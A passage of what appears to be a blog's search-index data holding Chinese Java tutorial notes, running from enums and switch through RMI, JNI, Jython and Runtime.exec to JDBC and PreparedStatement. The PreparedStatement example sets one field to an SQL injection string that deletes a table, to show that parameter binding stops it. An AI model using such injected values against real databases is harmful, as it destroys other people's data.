除了枚举的内容，还可以添加属性/构造函数/方法\n- 构造函数只能是package-private(default)或者private，内部调用\n```java\nenum Fruit\n{\n    APPLE(10), ORANGE(8);\n    private int price;\n    \n    Fruit(int price) {\n        this.price = price;\n    }\n    \n    public int getPrice() {\n        return this.price;\n    }\n}\n```\n- 所有的enum类型都是Enum的子类，也继承了相应方法\n    - ordinal()返回枚举值所在的索引位置, 从0开始\n    - compareTo()比较两个枚举值的索引位置大小\n    - toString()返回枚举值的字符串表示\n    - valueOf()将字符串初始化为枚举对象\n    - values()返回所有的枚举值\n```java\nenum Day\n{\n    MONDAY, TUESDAY, WEDNESDAY, THURSDAY, FRIDAY, SATURDAY, SUNDAY;\n}\nDay d1 = Day.MONDAY;\nDay d2 = Enum.valueOf(Day.class, \"MONDAY\");\nSystem.out.println(d1 == d2);    //true\n\nDay d3 = Enum.valueOf(Day.class, \"TUESDAY\");\nSystem.out.println(d1.compareTo(d3)); //MONDAY<TUESDAY\n\n//遍历所有的枚举值\nfor(Day item : Day.values())\n{\n    System.out.println(item.toString() + \",\" + item.ordinal());\n}        \n```\n\n## **2.不定项参数和静态导入**\n### **不定项参数**\n- JDK 5提供了不定项参数(可变参数)功能\n- 类型后面加3个点，如int.../double.../String.../\n- 可变参数，本质上是一个数组\n```java\npublic static void print(String... args) {\n    System.out.println(args.length);\n    for (String arg : args) {\n        System.out.println(arg);\n    }\n}\nprint();\nprint(\"aaa\");\nprint(\"aaa\", \"bbb\");\nprint(\"aaa\", \"bbb\", \"ccc\");\n```\n- 一个方法只能有**一个不定项参数**，且必须位于参数列表的最后\n```java\n//错误：一个方法不可以有多个可变参数\npublic static void print(String... args, int... irgs) {\n        \n}\n```\n- 重载的优先级规则1：**固定参数的方法，比可变参数优先级更高**\n```java\n//当只有一个参数时，本方法优先级更高\npublic static void print(String s)\n{\n     System.out.println(\"I am another method\");\n}\n```\n- 重载的优先级规则2：**调用语句，同时与两个带可变参数的方法匹配，则报错**\n```java\n//错误：一个调用语句不能同时有2个带可变参数的方法适配\npublic static void print(String s1, String... args)\n{\n\n}\n```\n\n### **静态导入**\n- import 导入程序所需要的类\n```java\nimport static java.lang.Math.pow;\nimport static java.lang.Math.sqrt;\nimport static java.lang.System.out;\n\npublic class ImportStaticTest {\n    public static void importMath()    {\n        int a=3, b=4, c=0;\n        c = (int) sqrt(pow(a,2)+pow(b,2));\n        out.println(\"c is \" + c);\n    }\n}\n```\n- import static 导入一个类的**静态方法和静态变量**(JDK5引入)\n    - 少使用 * 通配符，不滥用，最好具体到静态变量或方法\n    - 静态方法名具有明确特征，如有重名，需要补充类名\n\n## **3.自动拆装箱，多异常并列，数值类型赋值优化**\n### **自动装箱和拆箱(auto-boxing/auto-unboxing)**\n- 从JDK5.0开始引入，简化基本类型和对象转换的写法\n- 基本类型：boolean/byte/char/int/short/long/float/double\n- 对象：Boolean/Byte/Character/Integer/Short/Long/Float/Double\n```java\nInteger obj1 = 5;  //自动装箱\nInteger obj2 = Integer.valueOf(5);\n\nint a1 = obj1;     //自动拆箱\nint a2 = obj1.intValue();\n```\n### **注意事项**\n- 装箱和拆箱是编译器的工作，在class中已经添加转化。虚拟机没有自动装箱和拆箱的语句\n- ==：基本类型是内容相同，对象是指针是否相同(内存同一个区域) \n- **基本类型没有空值，对象有null，可能触发NullPointerException**\n- 当一个基础数据类型与封装类进行 ==、+、-、* 、/运算时，会将封装类进行拆箱，对基础数据类型进行运算\n- **谨慎使用多个非同类的数值类对象进行运算**\n\n### **多异常并列**\n- 多个异常并列在一个catch中 \n    - 从JDK7.0开始引入，简化写法\n```java\ntry {\n    test();\n}\ncatch(IOException | SQLException ex) {\n    //JDK7开始，支持一个catch写多个异常\n    //异常处理\n}\n```\n- 多个异常之间不能有(直接/间接)**继承关系**，如果有，则报错\n```java\ntry {\n    test2();\n}\ncatch(IOException | FileNotFoundException ex) {\n    //异常处理\n}\n```\n\n### **数值类型赋值优化**\n- Java 7的新语法：整数类型用二进制数赋值\n    - 避免二进制计算\n    - byte/short/int/long\n```java\nbyte a1 = (byte) 0b00100001;\nshort a2 = (short) 0b1010000101000101;\nint a4 = 0b101;\nint a5 = 0B101; //B可以大小写\nlong a6 = 0b1010000101000101101000010100010110100001010001011010000101000101L;\n```\n - Java 7的新语法：在数值字面量(literal)中使用下划线\n    - 增加数字的可读性和纠错功能\n    - short/int/long/float/double\n    - 下划线只能出现数字中间，前后必须有数字\n    - 允许在二/八/十/十六进制的数字中使用\n```java\nint a3 = 0b0111_1011_0001; //二进制, 0b开头\nint a4 = 0_214;           //八进制, 0开头\nint a5 = 123___45;         //可以多个下划线\nint a6 = 0x7_B_1;          //十六进制\nfloat a7 = 3.56_78f;       //float\ndouble a8 = 1.3_45__67;    //double\n\nint b1 = 0b_123_4;  //_必须在数字之间\nint b2 = 0123_4_;   //_不能在末尾\nint b3 = _123;      //_不能在开头\nint b4 = 0_x_123;   //不能拆开0x\nint b5 = 0x_51;     //_必须在数字之间\nlong b6 = 1000_L;   //_必须在数字之间\nfloat b7 = 1.34f_;  //_不能在末尾\n```\n\n## **4.接口方法**\n- Java 8推出接口的默认方法/静态方法(都带实现的)，为Lambda表达式提供支持\n### **接口的默认方法**\n- 以**default**关键字标注，其他的定义和普通函数一样\n- 规则1：默认方法**不能重写**Object中的方法\n- 规则2：实现类可以**继承/重写**父接口的默认方法\n- 规则3：接口可以**继承/重写**父接口的默认方法\n- 规则4：当父类和父接口都有(同名同参数)默认方法，**子类继承父类的默认方法**，这样可以兼容JDK7及以前的代码\n- 规则5：子类实现了2个接口(均有同名同参数的默认方法)，**那么编译失败，必须在子类中重写这个default方法**\n```java\npublic interface NewAnimal {\n    public default void move() {\n        System.out.println(\"I can move.\");\n    }\n}\n```\n\n### **接口的静态方法**\n- 该静态方法属于本接口的，**不属于子类/子接口**\n- 子类(子接口)没有继承该静态方法，只能通过**所在的接口名**来调用\n```java\npublic interface StaticAnimal {\n    public static void move() {\n        System.out.println(\"I can move\");\n    }\n}\n```\n\n### **接口的私有方法**\n- Java 9推出，带实现\n- 解决多个默认方法/静态方法的内容重复问题\n- 私有方法属于本接口，只在本接口内使用，**不属于子类/子接口**\n- 子类(子接口)没有继承该私有方法，也无法调用\n- 静态私有方法可以被静态/默认方法调用，非静态私有方法被默认方法调用\n```java\npublic interface PrivateAnimal {\n    private void move() {\n        //非静态的私有方法\n        System.out.println(\"I can move\");\n        System.out.println(\"I am growing\");\n    }\n    private static void move2() {\n        //静态的私有方法\n        System.out.println(\"I can move\");\n        System.out.println(\"I am growing\");\n    }\n}\n```\n\n### **接口 vs 抽象类**\n- 相同点(截止至Java 12以前，接口和抽象类对比) \n    - 都是抽象的，都不能被实例化，即不能被new\n    - 都可以有实现方法\n    - 都可以不需要继承者实现所有的方法\n- 不同点(截止至Java 12以前，接口和抽象类对比) 、\n    - 抽象类最多只能继承一个，接口可以实现多个\n    - 接口的变量默认是public static final，且必须有初值，子类不能修改；而抽象类的变量默认是default，子类可以继承修改\n    - 接口没有构造函数，抽象类有构造函数\n    - 接口没有main函数，抽象类可以有main函数\n    - 接口有public/default/private 的方法，抽象类有public/private/protected/不写关键字的(default)的方法\n\n## **5.try-with-resource和Resource Bundle文件加载**\n### **try-with-resource**\n- JDK7提供try-with-resource，比try-catch-finally更简便\n    - 资源要求定义在try中。若已经在外面定义，则需要一个本地变量\n- JDK9不再要求定义临时变量，可以直接使用外部资源变量\n```java\nString line;\n//try-resource 语句，自动关闭资源\ntry (BufferedReader in = new BufferedReader(new InputStreamReader(new FileInputStream(\"c:/temp/abc.txt\")))) {\n    while ((line = in.readLine()) != null) {\n        System.out.println(line);\n    }\n} catch(Exception ex) {\n    ex.printStackTrace();\n}\n```\n- try-with-resource原理\n    - 资源对象必须实现 **AutoCloseable接口**，即实现**close方法**\n```java\npublic class MyTryWithResourceTest {\n    public static void main(String[] args) {\n        //将会自动调用conn的close方法\n        try(MyConnection conn = new MyConnection()){\n            conn.sendData();\n        } catch(Exception ex) {\n            ex.printStackTrace();\n        }\n    }\n}\n\nclass MyConnection implements AutoCloseable {\n     public void sendData() throws Exception {\n         System.out.println(\"Send Data....\");\n     }\n     public void close() throws Exception {\n         System.out.println(\"Close....\");\n     }\n}\n```\n\n### **ResourceBundle文件加载**\n- Java 8及以前，ResourceBundle默认以ISO-8859-1方式加载Properties文件\n    - **需要利用native2ascii工具(JDK自带)对文件进行转义**\n- JDK9及以后， ResourceBundle默认以UTF-8方式加载Properties文件\n    - **JDK9及以后，已经删除native2ascii工具**\n    - **新的Properties文件可以直接以UTF-8保存**\n    - 已利用native2ascii工具转化后的文件，不受影响。即ResourceBundle 若解析文件不是有效的UTF-8，则以ISO-8859-1方式加载\n\n## **6.var类型和switch**\n### **var类型**\n- Java以前一直是一种强类型的程序语言\n    - 每个变量在定义时就确定了类型\n    - 类型固定了，就不能更改\n- Java 10推出var：局部变量推断\n    - 避免信息冗余\n    - 对齐了变量名\n    - 更容易阅读\n    - 本质上还是强类型语言，编译器负责推断类型，并写入字节码文件。因此推断后不能更改！！！\n- var的限制\n    - **可以用在局部变量上，非类成员变量**\n    - **可以用在for/for-each循环中**\n    - **声明时必须初始化**\n    - **不能用在方法(形式)参数和返回类型**\n    - **大面积滥用会使代码整体阅读性变差**\n    - **var只在编译时起作用，没有在字节码中引入新的内容，也没有专门的JVM指令处理var**\n\n### **switch**\n- 支持的类型：byte/Byte, short/Short, int/Integer, char/Character, **String(7.0), Enum枚举(5.0)**\n- **不支持long/float/double**\n- 多分支合并，采用->直接连接判定条件和动作(**JDK12支持**)\n```java\npublic static int judgeMonthDay12(String month) {\n    //this method works based on Java 12.\n    int result = 0;\n    switch(month) {\n        case \"Jan\",\"Mar\",\"May\",\"July\",\"Aug\",\"Oct\",\"Dec\" -> result = 31;            \n        case \"Apr\",\"June\",\"Sep\",\"Nov\" -> result = 30;\n        case \"Feb\" -> result = 28;\n        default -> result = -1;\n    }\n    return result;\n}\n```\n- switch直接在表达式赋值(**JDK12支持**)\n```java\npublic static void testSwitchReturn() {\n    int num = 1;\n    int days = switch (num) {\n        case 1,3,5,7,8,10,12 -> 31;\n        case 4,6,9,11 -> 30;\n        default -> {\n            int result = 28;\n            break result;  //代码块中break返回结果\n        }\n    };\n    System.out.println(days);\n}\n```","tags":["Java"],"categories":["Java","Java高阶"]},{"title":"Java 混合编程","url":"/reimu-lighthouse/20210922/java-hybrid-programming/","content":"## **1.RMI**\n- RMI：Remote Method Invocation 远程方法调用\n- 两个位于不同JVM虚拟机的Java程序互相请求访问\n\n### **RMI的参数和返回值**\n-  (**自动化**) 传递远程对象(实现Remote接口) \n    - 当一个对远程对象的引用从一个JVM传递到另一个JVM，该远程对象的发送者和接收者将持有**同一个实体对象的引用**。这个引用并非是一个内存位置，而是由网络地址和该远程对象的唯一标识符构成的。\n**###两个JVM拥有同一个对象###**\n- (**自动化**) 传递可序列化对象(实现Serializable接口) \n    - JVM中的一个对象经过序列化后的字节，通过网络，其副本传递到另一个JVM中，并重新还原为一个Java对象。\n**###每个JVM拥有自己的对象###**\n\n```java\n//Client\nContext namingContext = new InitialContext();\n      \n//开始查找RMI注册表上有哪些绑定的服务\nEnumeration<NameClassPair> e = namingContext.list(\"rmi://127.0.0.1:8001/\");\nwhile (e.hasMoreElements())\n    System.out.println(e.nextElement().getName());\n\n//获取某一个地址上的服务类\nString url = \"rmi://127.0.0.1:8001/warehouse1\";      \nWarehouse centralWarehouse = (Warehouse) namingContext.lookup(url);\n/*\n//接口类\npublic interface Warehouse extends Remote\n{  \n   double getPrice(String description) throws RemoteException;\n}\n*/\n\n//输入参数  取得结果\nString descr = \"面包机\";\ndouble price = centralWarehouse.getPrice(descr);\nSystem.out.println(descr + \": \" + price);\n\n//Server\nSystem.out.println(\"产生服务器对象\");\nWarehouseImpl centralWarehouse = new WarehouseImpl();\n\nSystem.out.println(\"将服务器对象绑定在8001端口，对外提供服务\");\nLocateRegistry.createRegistry(8001);//定义端口号\nNaming.rebind(\"rmi://127.0.0.1:8001/warehouse1\", centralWarehouse);\n\n//实现类\npublic class WarehouseImpl extends UnicastRemoteObject implements Warehouse\n{\n   private Map<String, Double> prices;\n\n   public WarehouseImpl() throws RemoteException\n   {\n      //物品列表\n      prices = new HashMap<>();\n      prices.put(\"面包机\", 24.95);\n      prices.put(\"微波炉\", 49.95);\n   }\n\n   public double getPrice(String description) throws RemoteException\n   {\n      Double price = prices.get(description);\n      return price == null ? 0 : price;\n   }\n}\n//接口类\npublic interface Warehouse extends Remote\n{  \n   double getPrice(String description) throws RemoteException;\n}\n```\n\n- RMI优点\n    - 跨平台分布式对象调用\n    - 完全对象支持\n    - 安全策略\n- RMI缺点\n    - 双方必须是Java语言实现\n    - 不如消息传递协作方便\n\n## **2.JNI**\n- JNI，Java Native Interface\n- Java和本地C代码进行互操作\n    - Java调用C程序完成一些需要快速计算的功能(**常见，重点**) \n    - C调用Java程序(基于反射的方法)\n\n### **基本步骤**\n- 在Java类中声明一个本地方法，使用native函数\n```java\nclass HelloNative {\n    public static native void greeting();\n}\n```\n- 调用javac.exe编译，得到HelloNative.class\n- 调用javah.exe得到包含该方法(Java_HelloNative_greeting)的头文件HelloNative.h\n- 实现.c文件(对应HelloNative.h)\n```c\n#include \"HelloNative.h\"\n\nJNIEXPORT void JNICALL Java_HelloNative_greeting(JNIEnv* env, jclass cl) {\n    printf(\"Hello Native World\\n\");\n}\n```\n- 将.c和.h文件，整合为共享库(DLL)文件\n- 在Java类中，加载相应的共享库文件\n```java\nHelloNative.greeting();\nstatic {\n    System.loadLibrary(\"HelloNative\"); //dll名字\n}\n```\n\n## **3.Nashorn**\n- 脚本引擎，ScriptEngine\n    - Nashorn，JDK 8自带的JS解释器(JDK6/7是Rhino解释器) \n```java\nScriptEngine engine = new ScriptEngineManager().getEngineByName(“nashorn”)\n```\n- 主要方法\n    - eval，执行一段js脚本. eval(String str), eval(Reader reader)\n    - put，设置一个变量\n    - get，获取一个变量\n    - createBindings, 创建一个Bindings\n    - setBindings, 设置脚本变量使用的范围\n\n```java\n//Test1\nScriptEngine engine = new ScriptEngineManager().getEngineByName(\"nashorn\"); \n\nengine.put(\"a\", 100);\nengine.put(\"b\", 200);\nengine.eval(\"var c = a+b\");\nString result = engine.get(\"c\").toString();\n\nSystem.out.println(result);\n//Test2\nScriptEngine engine = new ScriptEngineManager().getEngineByName(\"nashorn\"); \nSimpleBindings simpleBindings = new SimpleBindings(); // 传递参数到js\nsimpleBindings.put(\"a\", 100); \nsimpleBindings.put(\"b\", 200); \n\nObject result = engine.eval(\"load('src/edu/ecnu/sum2.js')\", simpleBindings);\n/*\nsrc/edu/ecnu/sum2.js\nc = a + b;\n*/\nSystem.out.println(result);\n//Test3\nScriptEngine engine = new ScriptEngineManager().getEngineByName(\"nashorn\"); \nFileReader scriptFile = new FileReader(\"src/edu/ecnu/sum3.js\");\n/*\nsrc/edu/ecnu/sum3.js\nfunction sum(a, b)\n{\n   return a + b;\n}\n*/\nengine.eval(scriptFile);\n\nInvocable in = (Invocable) engine;\nString result = in.invokeFunction(\"sum\",100,200).toString();\nSystem.out.println(result);\n```\n\n### **JDK支持的脚本引擎工厂**\n\n|引擎|名字|MIME类型|文件扩展|\n|-|-|-|-|\n|Nashorn|nashorn,js|text/javascript|js|\n|Groovy|groovy|无|groovy|\n|Renjin|Renjin|text/x-R|R,r,S,s|\n|SISC Scheme|sisc|无|scheme,sisc|\n\n## **4.Jython**\n- Jython是Python语言在Java平台的实现\n- Jython是在JVM上实现的Python，由Java编写\n- Jython将Python源码编译成JVM字节码，由JVM执行对应的字节码，因此能很好的与JVM集成\n- **Jython并不是Java和Python的连接器**\n\n### **关键类**\n- PythonInterpreter\n    - exec 执行语句\n    - set 设置变量值\n    - get 获取变量值\n    - execfile执行一个python文件\n- PyObject\n- PyFunction\n```java\n// 执行Python程序语句\nPythonInterpreter pi = new PythonInterpreter();\npi.exec(\"import sys\");\npi.set(\"a\", new PyInteger(42));\npi.exec(\"print a\");\npi.exec(\"x = 2+2\");\nPyObject x = pi.get(\"x\");\nSystem.out.println(\"x: \" + x);\n\n//执行Python文件\nPythonInterpreter pi = new PythonInterpreter();\npi.execfile(\"src/main/java/edu/ecnu/hello.py\");\npi.cleanup();\npi.close();\n\n//执行Python文件并传参\ntry (PythonInterpreter pi = new PythonInterpreter()) {\n    pi.set(\"cnt\", 5);\n    pi.execfile(\"src/main/java/edu/ecnu/randomSum.py\");\n    PyObject sum = pi.get(\"sum\");\n    System.out.println(\"Sum is: \" + sum);\n}\n/*\nsrc/main/java/edu/ecnu/randomSum.py\nfrom java.util import Random\nr = Random()\nsum = 0\nfor i in xrange(cnt):\n    randomNum = r.nextInt()\n    print randomNum\n    sum += randomNum\n*/\n\n//调用Python程序中的函数\nPythonInterpreter pi = new PythonInterpreter();        \npi.execfile(\"src/main/java/edu/ecnu/calculator1.py\");\nPyFunction pf = pi.get(\"power\", PyFunction.class);\nPyObject result = pf.__call__(Py.newInteger(2), Py.newInteger(3)); //2^3\nSystem.out.println(result);\npi.cleanup();\npi.close();\n/*\nsrc/main/java/edu/ecnu/calculator1.py\nimport math\n\ndef power(x, y):\n    return math.pow(x, y)\n*/\n\n//调用Python程序中的类\nPythonInterpreter pi = new PythonInterpreter();\npi.execfile(\"src/main/java/edu/ecnu/calculator2.py\");\n\n//在Java中调用Python对象实例的方法\nString pythonClassName = \"Calculator\";  // python类名        \nString pythonObjName = \"cal\"; // python对象名    \npi.exec(pythonObjName + \"=\" + pythonClassName + \"()\"); // 实例化python对象        \nPyObject pyObj = pi.get(pythonObjName); // 获取实例化的python对象\n\n// 调用python对象方法,传递参数并接收返回值\nPyObject result = pyObj.invoke(\"power\", new PyObject[] {Py.newInteger(2), Py.newInteger(3)}); \ndouble power = Py.py2double(result);\nSystem.out.println(power);\npi.cleanup();\npi.close();\n/*\nimport math\n\nclass Calculator(object):\n\n    def power(self, x, y):\n        return math.pow(x,y)\n*/\n```\n\n## **5.Web Service**\n- 由万维网联盟(W3C, World Wide Web Consortium)提出\n- 消除语言差异、平台差异、协议差异和数据结构差异，成为不同构件模型和异构系统之间的集成技术\n- Web Service是为实现跨网络操作而设计的软件系统，提供了相关的操作接口，其他应用可以使用SOAP消息，以预先指定的方式来与Web Service进行交互\n\n### **wsimport 工具**\n- %JAVA_HOME%\\bin目录下\n- 根据wsdl文档，自动产生客户端中间代码\n```cmd \nwsimport -keep -verbose http://ws.webxml.com.cn/WebServices/MobileCodeWS.asmx?WSDL\n```\n\n### **基本步骤**\n- 调用wsimport所产生客户端中间代码\n- 提供相应参数\n- 获取返回结果\n```java\n/**\n* use wsimport to parse wsdl\n* wsimport -keep -verbose http://ws.webxml.com.cn/WebServices/MobileCodeWS.asmx?WSDL\n* copy the generated class to this project, and invoke them\n* \n* 调用手机号查询web service\n* @param args\n*/\nMobileCodeWS mobileCodeWS = new MobileCodeWS();\nMobileCodeWSSoap  mobileCodeWSSoap = mobileCodeWS.getMobileCodeWSSoap();\nString tel=mobileCodeWSSoap.getMobileCodeInfo(\"13722222222\",null); //修改为有效号码\nSystem.out.println(tel);\n```\n\n- Java 调用 Web Service 其他办法\n    - Axis/Axis2 (axis.apache.org)\n    - 采用URLConnection访问 Web Service\n    - 采用HttpClient访问Web Service\n\n## **6.命令行**\n### **Runtime**\n- Java提供Runtime类 \n    - exec 以一个独立进程执行命令command, 并返回Process句柄\n    - 当独立进程启动后，需要处理该进程的输出流/错误流\n        - 调用Process.getInputStream 可以获取进程的输出流\n        - 调用Process.getErrorStream可以获取进程的错误输出流\n    - 调用Process.waitFor 等待目标进程的终止(当前进程阻塞)\n\n```java\nProcess p;\nString cmd = \"ipconfig /all\";  //查看ip地址\n\ntry {\n    // 执行命令\n    p = Runtime.getRuntime().exec(cmd);\n    // 取得命令结果的输出流\n    InputStream fis = p.getInputStream();\n    // 用一个读输出流类去读\n    InputStreamReader isr = new InputStreamReader(fis);\n    // 用缓冲器读行\n    BufferedReader br = new BufferedReader(isr);\n    String line = null;\n    // 直到读完为止\n    while ((line = br.readLine()) != null) {\n        System.out.println(line);\n    }\n\n    System.out.println(\"\");\n    int exitVal = p.waitFor(); //获取进程最后返回状态\n    System.out.println(\"Process exitValue: \" + exitVal);\n\n} catch (Exception e) {\n    e.printStackTrace();\n}\n```","tags":["Java"],"categories":["Java","Java高阶"]},{"title":"Java 数据库编程","url":"/reimu-lighthouse/20210922/java-sql-programming/","content":"## **1.数据库和SQL**\n- DB（文件集合，类似.doc,.docx文件） \n- DBMS: Database Management System（类似Office/WPS） \n    - 操纵和管理数据库的软件，可建立、使用和维护数据库\n- DB种类\n    - 文本文件/二进制文件\n    - Xls文件\n    - Access（包含在office里面，收费，只能运行在Windows上。32和64位，office95/97/2000/2003/2007/2010/…）\n    - **Mysql** /Postgresql/Berkely DB (免费, 但也有收费版。多平台，32和64位区分。) \n    - **SQL Server**（收费，只能运行Windows，32位和64位，中文文档。SQL Server 2000/2005/2008/2012/…,也有免费版，但有CPU和内存限制）\n    - **Oracle**/DB2（收费，全平台，32和64位，英文文档，也有免费版，但有CPU和内存限制） \n    - SQLite (免费,手机上使用)\n\n### **表**\n- 表：table, 实体\n    -  列：列、属性、字段\n    -  行：记录、元组tuple，数据\n- 数据值域：数据的取值范围\n- 字段类型\n    - int :整数 -2147483648~2147483647，4个字节\n    - double：小数，8个字节\n    - datetime ：时间，7个字节\n    - varchar：字符串，可变字节\n\n### **SQL**\n- 结构化查询语言(Structured Query Language)，简称SQL\n    - 是一种特殊目的的编程语言，是一种数据库查询和程序设计语言，用于存取数据以及查询、更新和管理关系数据库系统；同时也是数据库脚本文件的扩展名。 \n-  SQL标准\n    - SQL-86/SQL-89/SQL-92\n    - SQL:1999/ SQL:2003/ SQL:2008/ SQL:2011/ SQL:2016\n    - 基础的部分，所有标准都一样\n    - 标准仅仅是标准，每个厂商的数据库实现可能有一些不一致\n\n### **常规语句**\n```SQL\ncreate table t1(a int, b varchar(20));\ninsert into t1(a,b) values(1,’abc’);\nselect a from t1;\nselect a,b from t1 where a > 1;\ndelete from t1 where a = 10 and b=‘ab’;\nupdate t1 set a=2, b = ‘cd’ where a=1 and b=‘ab’;\ndrop table t1;\n```\n\n## **2.JDBC基本操作**\n- java.sql/ javax.sql （接口类）\n    - 根据数据库版本和JDBC版本合理选择\n    - 一般数据库发行包都会提供jar包，同时也要注意区分32位和64位\n- 连接字符串（样例） \n    - jdbc:oracle:thin:@127.0.0.1:1521:dbname\n    - jdbc:mysql://localhost:3306/mydb\n    - jdbc:sqlserver://localhost:1433; DatabaseName=dbname\n\n### **操作步骤**\n- 构建连接（搭桥） \n    - 注册驱动，寻找材质, class.forName(\"...\")\n    - 确定对岸目标 , 建桥 Connection\n- 执行操作（派个人过桥, 提着篮子，去拿数据） \n    -  Statement (执行者) \n    -  ResultSet(结果集) \n-  释放连接（拆桥） \n    -  connection.close();\n\n### **Statement**\n- Statement 执行者类\n    - 使用executeQuery()执行select语句，返回结果放在ResultSet\n    - 使用executeUpdate()执行insert/update/delete，返回修改的行数\n    - 一个Statement对象一次只能执行一个命令\n- ResultSet 结果对象\n    - next() 判断是否还有下一条记录\n    - getInt/getString/getDouble/……\n        - 可以按索引位置，可以按照列名\n\n```java\n//构建Java和数据库之间的桥梁介质\ntry{            \n    Class.forName(\"com.mysql.jdbc.Driver\");\n}catch(ClassNotFoundException e1){\n    //注册失败\n    e1.printStackTrace();\n    return;\n}\n\nString url=\"jdbc:mysql://localhost:3306/test\";        \nConnection conn = null;\ntry {\n    //构建Java和数据库之间的桥梁：URL，用户名，密码\n    conn = DriverManager.getConnection(url, \"root\", \"123456\");\n\n    //构建数据库执行者\n    Statement stmt = conn.createStatement(); \n    System.out.println(\"创建Statement成功！\");      \n\n    //执行SQL语句并返回结果到ResultSet\n    ResultSet rs = stmt.executeQuery(\"select bookid, bookname, price from t_book order by bookid\");\n\n    //update\n    int result = stmt.executeUpdate(\"update t_book set price = 300 where bookid = 1\");\n    result = stmt.executeUpdate(\"insert into t_book(bookid, bookname, price) values(4, '编译原理', 90)\");\n    result = stmt.executeUpdate(\"delete from t_book where id = 4\");\n    \n    //开始遍历ResultSet数据\n    while(rs.next()) {\n        System.out.println(rs.getInt(1) + \",\" + rs.getString(2) + \",\" + rs.getInt(\"price\"));\n    }\n    rs.close();\n    stmt.close();\n\n} catch (SQLException e){\n    e.printStackTrace();\n} finally {\n    try {\n        if(null != conn){\n            conn.close();\n        }\n    }\n    catch (SQLException e){\n        e.printStackTrace();\n    }            \n}\n```\n### **注意事项**\n- ResultSet不能多个做笛卡尔积连接\n- ResultSet最好不要超过百条，否则极其影响性能\n- ResultSet也不是一口气加载所有的select结果数据\n- Connection 很昂贵，需要及时close\n- Connection所用的jar包和数据库要匹配\n\n## **3.JDBC高级操作**\n### **事务**\n- 数据库事务，Database Transaction。\n-作为单个逻辑工作单元执行的一系列操作，**要么完全地执行，要么完全地不执行**\n- 事务，必须满足所谓的ACID（**原子性、一致性、隔离性和持久性**）属性\n- 事务是数据库运行中的逻辑工作单位，由DBMS中的事务管理子系统负责事务的处理\n\n### **JDBC事务**\n- 关闭自动提交，实现多语句同一事务：\n    -  connection.setAutoCommit(false);\n    - connection.commit(); 提交事务\n    - connection.rollback(); 回滚事务\n- 保存点机制\n    - connection.setSavepoint()\n    - connection.rollback(Savepoint)\n```java\nconn.setAutoCommit(false);\ninsertBook(conn, \"insert into t_book values(101, 'aaaa', 10)\");\ninsertBook(conn, \"insert into t_book values(102, 'bbbb', 10)\");\ninsertBook(conn, \"insert into t_book values(103, 'cccc', 10)\");\nSavepoint phase1 = conn.setSavepoint(); //设置一个保存点\ninsertBook(conn, \"insert into t_book values(104, 'cccc', 10)\");\ninsertBook(conn, \"insert into t_book values(105, 'cccc', 10)\");\nconn.rollback(phase1);  //回滚到phase1保存点，即上面2行无效\nconn.commit();\n\npublic static void insertBook(Connection conn, String sql) {\n    try {\n        // 构建数据库执行者\n        Statement stmt = conn.createStatement();\n\n        // 执行SQL语句\n        int result = stmt.executeUpdate(sql);\n        stmt.close();\n    } catch (SQLException e) {\n        e.printStackTrace();\n    }\n}\n```\n\n### **PreparedStatement**\n- Java提供PreparedStatement，更为安全执行SQL\n- 和Statement区别是使用“?” 代替字符串拼接\n- 使用setXXX(int,Object)的函数来实现对于?的替换\n    - 注：不需要考虑字符串的两侧单引号\n    - 参数赋值，清晰明了，拒绝拼接错误\n```java\n//构建Java和数据库之间的桥梁：URL，用户名，密码\nConnection conn = DriverManager.getConnection(url, \"root\", \"123456\");\n\n//使用“?” 代替字符串拼接\nString sql = \"insert into t_book(bookid,bookname,price) values(?,?,?)\";\n\n//构建数据库执行者\nPreparedStatement pstmt = conn.prepareStatement(sql);\n\n//执行SQL语句\nint bookid = 10;\nString bookName = \"Effective Java',50);delete from t_book;insert into t_book values(101, 'faked book\";\nint price = 50;\n\n//设定value参数\npstmt.setInt(1, bookid);\npstmt.setString(2, bookName);\npstmt.setInt(3, price);\n\nint result = pstmt.executeUpdate();\n\npstmt.close();\n```\n- 提供addBatch批量更新功能\n- Select语句一样用ResultSet接收结果\n- 使用PreparedStatement的好处： \n    -  防止注入攻击\n    - 防止繁琐的字符串拼接和错误\n    - 直接设置对象而不需要转换为字符串\n    - PreparedStatement使用预编译速度相对Statement快很多\n```java\nConnection conn = DriverManager.getConnection(url, \"root\", \"123456\");\n            \nString sql = \"insert into t_book(bookid,bookname,price) values(?,?,?)\";\n\n//构建数据库执行者\nPreparedStatement pstmt = conn.prepareStatement(sql);\n\n//执行SQL语句\nString bookName = \"aaaaaaaaaaaaaaaa\";\nint price = 50;\n\n//values(1, 'Effective Java', 50)\nfor(int i=200;i<210;i++)\n{\n    pstmt.setInt(1, i);\n    pstmt.setString(2, bookName);\n    pstmt.setInt(3, price);\n    pstmt.addBatch();\n}            \npstmt.executeBatch();\n\npstmt.close();  \n```\n\n### **ResultSetMetaData**\n- ResultSet可以用来承载所有的select语句返回的结果集\n- ResultSetMetaData来获取ResultSet返回的属性（如，每一行的名字类型等） \n    - getColumnCount()，返回结果的列数\n    - getColumnClassName(i)，返回第i列的数据的Java类名\n    - getColumnTypeName(i)，返回第i列的数据库类型名称\n    - getColumnType(i)，返回第i列的SQL类型\n- 使用ResultSetMetaData解析ResultSet\n```java\n//构建Java和数据库之间的桥梁：URL，用户名，密码\nConnection conn = DriverManager.getConnection(url, \"root\", \"123456\");\n\n//构建数据库执行者\nStatement stmt = conn.createStatement();    \n\n//执行SQL语句并返回结果到ResultSet\nResultSet rs = stmt.executeQuery(\"select bookid, bookname, price from t_book order by bookid\");\n\n//获取结果集的元数据\nResultSetMetaData meta = rs.getMetaData(); \nint cols = meta.getColumnCount(); \nfor(int i=1;i<=cols;i++)\n{\n    System.out.println(meta.getColumnName(i) + \",\" + meta.getColumnTypeName(i));\n}\n\nrs.close();\nstmt.close();\n```\n\n## **4.数据库连接池**\n### **享元模式**\n- 经典23个设计模式的一种，属于结构型模式。 \n- 一个系统中存在大量的相同的对象，由于这类对象的大量使用，会造成系统内存的耗费，可以使用享元模式来减少系统中对象的数量\n\n### **数据库连接池**\n- 池Pool的概念\n    - 初始数、最大数、增量、超时时间等参数。 \n- 常用的数据库连接池\n    - DBCP (Apache, http://commons.apache.org/，性能较差) \n    -  C3P0 (https://www.mchange.com/projects/c3p0/)\n    - Druid (Alibaba, https://github.com/alibaba/druid)\n\n### **C3P0连接池**\n- 默认配置\n```xml\n<default-config> <!-- 默认配置 --> \n    <property name=\"driverClass\">com.mysql.jdbc.Driver</property>\n    <property name=\"jdbcUrl\">jdbc:mysql://localhost:3306/test</property>\n    <property name=\"user\">root</property>\n    <property 